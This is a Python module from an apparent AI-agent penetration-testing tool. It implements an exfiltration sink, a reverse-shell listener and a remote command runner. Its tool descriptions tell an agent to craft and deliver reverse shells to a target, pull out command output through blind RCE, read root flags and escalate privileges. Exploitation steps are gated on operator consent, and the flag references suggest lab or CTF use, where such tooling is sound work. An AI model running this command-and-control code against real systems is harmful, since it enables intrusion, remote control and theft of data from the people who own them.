"""Attacker-side infrastructure: the reverse-shell listener and the exfil channel.

These bind on our own host rather than touching the target, which is why they are
scope-exempt; `shell_exec` runs over a session a target already connected back on.
"""
from __future__ import annotations

import asyncio
import base64
import random

from .core import (
    ScanContext,
    ToolError,
    _consent,
    _source_ip_for,
    tool,
)


def _b64_maybe(s: str) -> str:
    """Decode base64 if it looks like base64 text; otherwise return the original."""
    t = (s or "").strip()
    try:
        dec = base64.b64decode(t + "=" * (-len(t) % 4)).decode("utf-8", "replace")
        if dec and sum(c.isprintable() or c in "\r\n\t" for c in dec) / max(len(dec), 1) > 0.85:
            return dec
    except Exception:  # noqa: BLE001
        pass
    return t


class ExploitState:
    """Owns the attacker-side servers for one engagement: an HTTP exfil sink and a shell listener."""

    def __init__(self) -> None:
        self._exfil_server = None
        self.exfil_port = None
        self.exfil_hits: list[str] = []
        self._listener = None
        self.listen_port = None
        self._shell_reader = None
        self._shell_writer = None

    async def start_exfil(self, port: int) -> None:
        import urllib.parse
        hits = self.exfil_hits

        async def handle(reader, writer):
            try:
                data = await asyncio.wait_for(reader.read(1 << 20), timeout=15)
                text = data.decode("utf-8", "replace")
                head, _, body = text.partition("\r\n\r\n")
                payloads = [body.strip()] if body.strip() else []
                first = head.split("\r\n", 1)[0]
                if "?" in first:
                    q = first.split(" ")[1].split("?", 1)[1] if len(first.split(" ")) > 1 else ""
                    for kv in q.split("&"):
                        if "=" in kv:
                            payloads.append(urllib.parse.unquote_plus(kv.split("=", 1)[1]))
                for p in payloads:
                    if p:
                        hits.append(_b64_maybe(p))
                writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
                await writer.drain()
            except Exception:  # noqa: BLE001
                pass
            finally:
                try:
                    writer.close()
                except Exception:  # noqa: BLE001
                    pass

        self._exfil_server = await asyncio.start_server(handle, "0.0.0.0", port)
        self.exfil_port = port

    async def start_listener(self, port: int) -> None:
        async def handle(reader, writer):
            if self._shell_writer is None:
                self._shell_reader, self._shell_writer = reader, writer
            else:
                writer.close()  # first shell wins

        self._listener = await asyncio.start_server(handle, "0.0.0.0", port)
        self.listen_port = port

    def shell_connected(self) -> bool:
        return self._shell_writer is not None

    async def shell_exec(self, command: str, timeout: float = 20.0) -> str:
        if self._shell_writer is None:
            raise ToolError("no reverse shell connected yet — start listener, inject a reverse "
                            "shell to the attacker ip:port, wait for listener(status) connected, then retry")
        marker = f"__PWN{random.randint(10**7, 10**8)}__"
        self._shell_writer.write(f" {command} 2>&1; echo {marker}\n".encode())
        await self._shell_writer.drain()
        buf = b""
        try:
            while marker.encode() not in buf:
                chunk = await asyncio.wait_for(self._shell_reader.read(8192), timeout=timeout)
                if not chunk:
                    break
                buf += chunk
        except asyncio.TimeoutError:
            pass
        out = buf.decode("utf-8", "replace").split(marker)[0]
        return out.strip()


def _exploit(ctx: ScanContext) -> ExploitState:
    if ctx.exploit is None:
        ctx.exploit = ExploitState()
    return ctx.exploit


@tool("The attacker IP the target can reach you on (for reverse shells / exfil callbacks). Read-only.",
      {},
      [],
      scope_exempt=True)
async def attacker_info(ctx: ScanContext, args: dict) -> dict:
    ip = _source_ip_for(ctx.target)
    return {"attacker_ip": ip, "note": "this is the IP the target can reach you on — use it for "
            "reverse shells and exfil callbacks"}


@tool("Readable channel for BLIND RCE: action=start opens a local HTTP sink and tells you how "
      "to send command output to it (base64); action=poll returns the decoded output you received; "
      "action=stop closes it. Use this to run ANY command through blind RCE and READ its output "
      "(incl. flags) — never ask the operator to paste output. CONSENT-GATED.",
      {"action": {"type": "string", "enum": ["start", "poll", "stop"]}, "port": {"type": "integer"}},
      [],
      scope_exempt=True)
async def exfil(ctx: ScanContext, args: dict) -> dict:
    """Readable channel for BLIND RCE: start a local HTTP sink, inject a command that sends output
    to it (base64), then poll to read the decoded output."""
    action = str(args.get("action") or "start").lower()
    st = _exploit(ctx)
    if action == "poll":
        return {"hits": st.exfil_hits[-30:], "count": len(st.exfil_hits)}
    if action == "stop":
        if st._exfil_server is not None:
            st._exfil_server.close()
            st._exfil_server = None
        return {"ok": True, "stopped": True}
    # start
    if not await _consent(ctx, "start exfil/exploitation channel", ctx.target, "high"):
        return {"denied": True, "note": "operator did not approve exploitation"}
    port = int(args.get("port") or 8099)
    ip = _source_ip_for(ctx.target)
    try:
        if st._exfil_server is None:
            await st.start_exfil(port)
    except OSError as e:
        return {"error": f"could not bind exfil port {port}: {e}"}
    url = f"http://{ip}:{st.exfil_port}/"
    return {"ok": True, "attacker_ip": ip, "port": st.exfil_port, "url": url,
            "note": f"Any HTTP request that reaches {url} is captured here (body and query values are "
                    f"stored, base64 auto-decoded). Make the target send each command's output to this "
                    f"URL — you decide how (which download tool exists, how to encode so it survives "
                    f"transport), from what you observed about this machine. Then exfil(action=poll) to read it."}


@tool("Reverse-shell catcher: action=start opens a listener at your ip:port (you craft and "
      "deliver the reverse shell yourself, tuned to this target); action=status shows if a shell "
      "connected; action=stop closes it. After it connects, use shell_exec. CONSENT-GATED.",
      {"action": {"type": "string", "enum": ["start", "status", "stop"]}, "port": {"type": "integer"}},
      [],
      scope_exempt=True)
async def listener(ctx: ScanContext, args: dict) -> dict:
    """Reverse-shell catcher: start a listener, inject a reverse shell, then use shell_exec."""
    action = str(args.get("action") or "start").lower()
    st = _exploit(ctx)
    if action == "status":
        return {"connected": st.shell_connected(), "port": st.listen_port}
    if action == "stop":
        if st._listener is not None:
            st._listener.close()
            st._listener = None
        return {"ok": True, "stopped": True}
    if not await _consent(ctx, "start reverse-shell listener", ctx.target, "high"):
        return {"denied": True, "note": "operator did not approve exploitation"}
    port = int(args.get("port") or 4444)
    ip = _source_ip_for(ctx.target)
    try:
        if st._listener is None:
            await st.start_listener(port)
    except OSError as e:
        return {"error": f"could not bind listener port {port}: {e}"}
    return {"ok": True, "attacker_ip": ip, "port": st.listen_port,
            "connected": st.shell_connected(),
            "note": f"A reverse shell that connects back to {ip}:{st.listen_port} will be caught here. "
                    f"Craft the payload YOURSELF for what this target actually has (reason from what "
                    f"you observed — which interpreters/tools exist, egress constraints; don't assume "
                    f"bash or nc). After delivering it, poll listener(action=status); once connected, use shell_exec."}


@tool("Run a command in the connected reverse shell and return its output — read the "
      "user/root flags, enumerate, escalate. Requires a shell from listener. CONSENT-GATED.",
      {"command": {"type": "string"}},
      ["command"],
      scope_exempt=True)
async def shell_exec(ctx: ScanContext, args: dict) -> dict:
    """Run a command in the connected reverse shell and return its output (read flags, enumerate)."""
    command = str(args.get("command") or args.get("cmd") or "").strip()
    if not command:
        raise ToolError("shell_exec needs a command")
    if not await _consent(ctx, f"run command on target: {command[:80]}", ctx.target, "high"):
        return {"denied": True, "note": "operator did not approve command execution"}
    st = _exploit(ctx)
    out = await st.shell_exec(command)
    return {"command": command, "output": out[:8000]}
